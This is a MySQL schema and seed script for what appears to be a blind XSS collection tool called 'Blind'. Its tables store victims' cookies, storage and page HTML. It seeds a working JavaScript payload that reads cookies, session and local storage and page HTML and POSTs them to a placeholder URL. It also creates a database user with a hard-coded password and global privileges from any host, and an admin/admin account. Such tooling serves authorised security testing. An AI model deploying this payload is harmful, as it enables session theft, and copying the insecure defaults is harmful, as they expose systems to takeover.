CREATE DATABASE Blind;

USE Blind;

CREATE TABLE `Projects` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`name` TEXT NOT NULL,
	`date` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
	`user` INT NOT NULL,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE `Users` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`name` CHAR(128) NOT NULL UNIQUE,
	`passwd` CHAR(128) NOT NULL UNIQUE,
	`salt` CHAR(128) NOT NULL UNIQUE,
	`type` CHAR(128) NOT NULL,
	`email` CHAR(255) NOT NULL UNIQUE,
	`date` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE `Links` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`name` TEXT NOT NULL,
	`description` TEXT NOT NULL,
	`path` char(255) NOT NULL UNIQUE,
	`date` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
	`payload` INT NOT NULL,
	`project` INT NOT NULL,
	`user` INT NOT NULL,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE `Response` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`type` TEXT NOT NULL,
	`payload` INT NOT NULL,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE `Payloads` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`name` TEXT NOT NULL,
	`payload` TEXT NOT NULL,
	`type` TEXT NOT NULL,
	`user_id` INT NOT NULL,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE `Requests` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`link` INT NOT NULL,
	`date` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE `RequestData` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`headers` TEXT NOT NULL,
	`ip` TEXT NOT NULL,
	`request` INT NOT NULL,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE `ClientData` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`user_agent` TEXT NOT NULL,
	`html` TEXT NOT NULL,
	`url` TEXT NOT NULL,
	`request` INT NOT NULL,
	`cookie` TEXT NOT NULL,
	`local_storage` TEXT NOT NULL,
	`session_storage` TEXT NOT NULL,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE `ResponseTypes` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`name` TEXT NOT NULL,
	`user` INT NOT NULL,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE `SiteSettings` (
	`registration` INT NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `UserSettings` (
	`id` INT NOT NULL AUTO_INCREMENT,
	`user_id` INT NOT NULL,
	`default_payload` INT NOT NULL DEFAULT 0,
	PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE USER `blindzone`@`%` IDENTIFIED BY 'BlindZoneP@ssw0rd';
GRANT ALL PRIVILEGES ON * . * TO 'blindzone'@'%';
FLUSH PRIVILEGES;

INSERT INTO ResponseTypes (name, user) VALUES ('Javascript', 1);

/* default user with admin/admin credentials */
INSERT INTO Users (name, passwd, salt, type, email) VALUES ('admin', '618f274f57de412d15ae036e565e4b794d24a25eccc2c53b464f4005ba2e3d43', '07fd2bce2cfebb7db5ea17f97f0d8979', 'administrator', 'example@example.example');
INSERT INTO Projects (name, user) VALUES ('Dummy project', 1);
INSERT INTO Links (name, description, path, project, user, payload) VALUES ('Dummy link', 'This is dummy link for tests', '1fqq616bremhftfy', 1, 1, 0);
INSERT INTO Payloads (name, user_id, payload, type) VALUES ('Blind XSS', 0, 'document.onreadystatechange=function(){if("complete"==document.readyState){try {dc = document.cookie} catch(e) {dc=null}try {htm = document.body.parentNode.innerHTML} catch(e) {htm=null}try {st = sessionStorage} catch(e) {st=null}try {lst = localStorage} catch(e) {lst=null}try {ua = navigator.userAgent} catch(e) {ua=null}try {durl = document.URL} catch(e) {durl=null}var e={URL:durl,SESSION_STORAGE:st,COOKIE:dc,LOCAL_STORAGE:lst,USER_AGENT:ua,HTML:htm};t=new XMLHttpRequest;t.open("POST","[URL]",!0);t.setRequestHeader("Content-Type","application/json");t.send(JSON.stringify(e))}};', 'Javascript');
INSERT INTO SiteSettings (registration) VALUES (1);
INSERT INTO UserSettings (user_id, default_payload) VALUES (1, 0);


ALTER TABLE `Projects` ADD CONSTRAINT `Projects_fk0` FOREIGN KEY (`user`) REFERENCES `Users`(`id`);
ALTER TABLE `Links` ADD CONSTRAINT `Links_fk2` FOREIGN KEY (`project`) REFERENCES `Projects`(`id`);
ALTER TABLE `Links` ADD CONSTRAINT `Links_fk3` FOREIGN KEY (`user`) REFERENCES `Users`(`id`);
ALTER TABLE `Links` ADD CONSTRAINT `Links_fk0` FOREIGN KEY (`response`) REFERENCES `Response`(`id`);
ALTER TABLE `Response` ADD CONSTRAINT `Response_fk0` FOREIGN KEY (`payload`) REFERENCES `Payloads`(`id`);
ALTER TABLE `Requests` ADD CONSTRAINT `Requests_fk0` FOREIGN KEY (`link`) REFERENCES `Links`(`id`);
ALTER TABLE `RequestData` ADD CONSTRAINT `RequestData_fk0` FOREIGN KEY (`request`) REFERENCES `Requests`(`id`);
ALTER TABLE `ClientData` ADD CONSTRAINT `ClientData_fk0` FOREIGN KEY (`request`) REFERENCES `Requests`(`id`);
